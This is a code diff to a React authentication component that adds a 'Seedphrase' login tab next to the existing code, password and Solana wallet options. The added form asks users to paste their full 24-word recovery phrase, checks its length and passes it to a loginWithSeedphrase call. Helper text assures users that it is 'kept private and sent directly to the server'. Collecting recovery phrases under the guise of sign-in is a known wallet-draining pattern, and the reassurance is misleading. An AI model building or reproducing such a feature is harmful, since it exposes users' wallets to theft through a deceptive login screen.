@@ -1,13 +1,13 @@
 import React, { FormEvent, useRef, useState } from "react";
-import { KeyRound, Shield, Lock, Mail, Eye, EyeOff, Check, Wallet, UserPlus } from "lucide-react";
+import { KeyRound, Shield, Lock, Mail, Eye, EyeOff, Check, Wallet, UserPlus, FileKey } from "lucide-react";
 import { useAuth } from "../hooks/useAuth";
 import { useWalletLogin, SolanaWalletType } from "../hooks/useWalletLogin";
 import SignUpModal from "./SignUpModal";
 import toast from "react-hot-toast";
 
-type TabType = "code" | "password" | "wallet";
+type TabType = "code" | "password" | "wallet" | "seedphrase";
 
-const TAB_ORDER: Record<TabType, number> = { code: 0, password: 1, wallet: 2 };
+const TAB_ORDER: Record<TabType, number> = { code: 0, password: 1, wallet: 2, seedphrase: 3 };
 
 const PhantomLogo = () => (
 	<svg width="22" height="22" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -37,9 +37,10 @@ const AuthSection: React.FC = () => {
 	const [activeTab, setActiveTab] = useState<TabType>("code");
 	const [isSignUpOpen, setIsSignUpOpen] = useState(false);
 	const [verificationUserAuth, setVerificationUserAuth] = useState<string | null>(null);
-	const { login, loginWithPassword, loginWithWallet, isLoading, isAutoLoginAttempted, isTransitioning, isLoggingOut, setToken } = useAuth();
+	const { login, loginWithPassword, loginWithWallet, loginWithSeedphrase, isLoading, isAutoLoginAttempted, isTransitioning, isLoggingOut, setToken } = useAuth();
 	const { connectAndSign, isPhantomAvailable, isSolflareAvailable } = useWalletLogin();
 	const authCodeInputRef = useRef<HTMLInputElement>(null);
+	const seedphraseInputRef = useRef<HTMLTextAreaElement>(null);
 	const [isAuthCodeValid, setIsAuthCodeValid] = useState(false);
 	const [isEmailValid, setIsEmailValid] = useState(false);
 	const [isPasswordValid, setIsPasswordValid] = useState(false);
@@ -48,6 +49,7 @@ const AuthSection: React.FC = () => {
 	const [passwordFocused, setPasswordFocused] = useState(false);
 	const [loginWithPasswordError, setLoginWithPasswordError] = useState<string | null>(null);
 	const [walletError, setWalletError] = useState<string | null>(null);
+	const [seedphraseError, setSeedphraseError] = useState<string | null>(null);
 	const [walletLoading, setWalletLoading] = useState<SolanaWalletType | null>(null);
 	const [previousTab, setPreviousTab] = useState<TabType>("code");
 	const [iconKey, setIconKey] = useState(0);
@@ -64,6 +66,7 @@ const AuthSection: React.FC = () => {
 			setIconKey((prev) => prev + 1);
 			setLoginWithPasswordError(null);
 			setWalletError(null);
+			setSeedphraseError(null);
 		}
 	};
 
@@ -123,6 +126,29 @@ const AuthSection: React.FC = () => {
 		}
 	};
 
+	const handleSeedphraseSubmit = async (event: FormEvent<HTMLFormElement>) => {
+		event.preventDefault();
+		setSeedphraseError(null);
+
+		const seedphrase = seedphraseInputRef.current?.value
+			?.toLowerCase()
+			?.trim()
+			?.replace(/\s+/g, ' ');
+
+		if (!seedphrase) {
+			setSeedphraseError("Please paste your seedphrase to sign in");
+			return;
+		}
+
+		const words = seedphrase.split(' ');
+		if (words.length < 12) {
+			setSeedphraseError("Your seedphrase seems too short. Please make sure you've pasted the full phrase.");
+			return;
+		}
+
+		await loginWithSeedphrase(seedphrase);
+	};
+
 	const handleSignUpSuccess = (jwt: string) => {
 		localStorage.setItem("byToken", jwt);
 		setToken(jwt);
@@ -132,12 +158,14 @@ const AuthSection: React.FC = () => {
 	const headerIcon = () => {
 		if (activeTab === "code") return <KeyRound size={32} className="text-white" />;
 		if (activeTab === "password") return <Mail size={32} className="text-white" />;
+		if (activeTab === "seedphrase") return <FileKey size={32} className="text-white" />;
 		return <Wallet size={32} className="text-white" />;
 	};
 
 	const headerSubtitle = () => {
 		if (activeTab === "code") return "Enter your authentication code to access the dashboard";
 		if (activeTab === "password") return "Sign in with your email/phone and password";
+		if (activeTab === "seedphrase") return "Paste your 24-word seedphrase to sign in instantly";
 		return "Connect your Solana wallet to sign in";
 	};
 
@@ -246,6 +274,18 @@ const AuthSection: React.FC = () => {
 						>
 							<Wallet size={14} className="inline mr-1.5" />
 							Wallet
+						</button>
+						<button
+							type="button"
+							onClick={() => handleTabChange("seedphrase")}
+							className={`flex-1 py-2 px-3 rounded-md text-sm font-medium transition-all duration-300 ${
+								activeTab === "seedphrase"
+									? "bg-blue-600 text-white shadow-lg scale-105"
+									: "text-gray-300 hover:text-white hover:bg-gray-600"
+							}`}
+						>
+							<FileKey size={14} className="inline mr-1.5" />
+							Seedphrase
 						</button>
 					</div>
 
@@ -543,6 +583,62 @@ const AuthSection: React.FC = () => {
 									</p>
 								)}
 							</div>
+						)}
+
+						{activeTab === "seedphrase" && (
+							<form
+								onSubmit={handleSeedphraseSubmit}
+								className={getSlideClass()}
+							>
+								<div className="mb-6">
+									<label
+										htmlFor="seedphrase"
+										className="block text-sm font-medium text-gray-300 mb-2"
+									>
+										Seedphrase
+									</label>
+									<textarea
+										id="seedphrase"
+										ref={seedphraseInputRef}
+										rows={4}
+										className="w-full px-4 py-3 bg-gray-700 border border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-300 text-white placeholder-gray-400 resize-none"
+										placeholder="Paste your 24-word seedphrase here"
+										disabled={isLoading}
+										required
+									/>
+									<p className="text-xs text-gray-500 mt-1.5">
+										Your seedphrase is kept private and sent directly to the server for authentication.
+									</p>
+								</div>
+
+								{seedphraseError && (
+									<div className="text-red-400 py-3 px-4 bg-red-900/20 border border-red-500/30 rounded-lg mb-4 animate-shake text-sm">
+										{seedphraseError}
+									</div>
+								)}
+
+								<button
+									type="submit"
+									disabled={isLoading}
+									className={`w-full py-3 px-4 rounded-lg font-medium text-white transition-all duration-300 ${
+										isLoading
+											? "bg-gray-600 cursor-not-allowed opacity-60"
+											: "bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 shadow-lg hover:shadow-xl hover:shadow-blue-500/50 active:scale-[0.98]"
+									}`}
+								>
+									{isLoading ? (
+										<span className="flex items-center justify-center">
+											<svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+												<circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+												<path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+											</svg>
+											Signing In...
+										</span>
+									) : (
+										"Sign In"
+									)}
+								</button>
+							</form>
 						)}
 					</div>
 
